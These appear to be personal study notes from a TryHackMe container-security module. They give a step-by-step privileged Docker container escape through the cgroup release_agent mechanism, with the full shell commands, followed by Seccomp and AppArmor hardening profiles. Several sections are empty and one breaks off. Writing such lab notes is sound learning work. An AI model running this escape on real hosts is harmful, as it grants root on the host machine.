---
icon: whale
description: Notes from the 'Container Security' module of TryHackMe
---

# Container Security

{% embed url="https://tryhackme.com/module/container-security" %}

## Container Vulnerabilities

### Privileged Containers

Docker containers can be run in two modes -

* User mode - interacts with the Host Operating System through Docker Engine
* Privileged - interacts directly with the Host OS

If a container is running with privileged access to the OS, commands can effectively be executed as root on the host. You can view capabilities of the container by running `capsh --print`.

Given below is an exploit on a privileged container using the `mount` syscall -

{% embed url="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" %}
The blog explaining the exploit in detail
{% endembed %}

Steps involved in the exploit -

1.  Create a group to use the Linux kernel to write and execute the exploit.

    The kernel uses `cgroups` to manage processes on the OS

    Since cgroups can be managed as root on the host, it can be mounted to `/tmp/cgrp` on the container
2. For the exploit to execute, we have to tell the kernel to run the code. Adding `1` to `/tmp/cgrp/x/notify_on_release` tells the kernel to execute something once the "cgroup" finishes
3. Find out where the container's files are stored on the host and store it as a variable.
4. Print the location of the exploit on the host system into `release_agent` so that the exploit will be executed by "cgroup" once it is released.
5. Turn the exploit into a shell on the host.
6. Execute a command, `cat /home/user1/flag.txt > $host_path/flag.txt`, to print the contents of `flag.txt` into a file on the container.
7. Make the exploit executable.
8. Create a process to store that into `/tmp/cgrp/x/cgroup.procs` so that once the process is released, the contents will be executed.

<details>

<summary>Commands to execute</summary>

{% code overflow="wrap" lineNumbers="true" %}
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/user1/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% endcode %}

</details>

### Escaping via Exposed Docker Daemon

When inter

### Remote Code Execution via Exposed Docker Daemon



### Abusing Namespaces



***

## Container Hardening

### Protecting the Docker Daemon



### Implementing Control Groups



### Preventing "Over-Privileged" Containers



### Seccomp and AppArmor

{% tabs %}
{% tab title="Seccomp" %}
It is an important security feature of Linux that restricts the actions that a program can do. It allows the user to create and enforce a list of rules of what actions (system calls) that application can make. For example, it can allow the application to make a system call to read a file but not allow it to make a system call to open a network connection. This reduces an attacker's ability to execute malicious commands whilst maintaining the application's functionality.

An example Seccomp profile for a web server that allows for files to be read and written to but does not allow for execution (execve, execveat).-

{% code title="profile.json" %}
```json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_X86",
    "SCMP_ARCH_X32"
  ],
  "syscalls": [
    { "names": [ "read", "write", "exit", "exit_group", "open", "close", "stat", "fstat", "lstat", "poll", "getdents", "munmap", "mprotect", "brk", "arch_prctl", "set_tid_address", "set_robust_list" ], "action": "SCMP_ACT_ALLOW" },
    { "names": [ "execve", "execveat" ], "action": "SCMP_ACT_ERRNO" }
  ]
}
```
{% endcode %}

Apply a profile to a container -

```bash
docker run --rm -it --security-opt seccomp=/path/to/profile.json mycontainer
```

&#x20;Resources -

{% embed url="https://man7.org/linux/man-pages/man2/seccomp.2.html" %}

{% embed url="https://docs.docker.com/engine/security/seccomp/" %}
{% endtab %}

{% tab title="AppArmor" %}
It is a similar security feature as Seccomp in Linux. It works differently, however, as it is not included in the application but in the OS. It is a Mandatory Access Control (MAC) system that determines the actions a process can execute based on a set of rules at the OS level.

Given below is a profile that makes sure that a container has the following capabilities:

* It can read files located in `/var/www/`, `/etc/apache2/mime.types` and `/run/apache2`.
* It can read and write to `/var/log/apache2`.
* It can bind to a TCP socket for port 80 but not other ports or protocols such as UDP.
* It cannot read from directories such as `/bin`, `/lib`, `/usr`.

{% code title="profile.json" %}
```
/usr/sbin/httpd {

  capability setgid,
  capability setuid,

  /var/www/** r,
  /var/log/apache2/** rw,
  /etc/apache2/mime.types r,

  /run/apache2/apache2.pid rw,
  /run/apache2/*.sock rw,

  # Network access
  network tcp,

  # System logging
  /dev/log w,

  # Allow CGI execution
  /usr/bin/perl ix,

  # Deny access to everything else
  /** ix,
  deny /bin/**,
  deny /lib/**,
  deny /usr/**,
  deny /sbin/**
}
```
{% endcode %}

To apply an AppArmor profile to a container, we need to -

1. Ensure that it is installed on the system using the command - `sudo aa-status.`
2. Create a profile.
3. Load the profile into AppArmor.
4. Run the container with the created profile.

Import the profile into AppArmor -

```bash
sudo apparmor_parser -r -W /path/to/profile.json
```

Apply it to the container at runtime -

```bash
docker run --rm -it --security-opt apparmor=/path/to/profile.json mycontainer
```

Resources -

{% embed url="https://gitlab.com/apparmor/apparmor/-/wikis/Documentation" %}

{% embed url="https://docs.docker.com/engine/security/apparmor/" %}
{% endtab %}
{% endtabs %}

### Reviewing Docker Images



### Compliance and Benchmarking

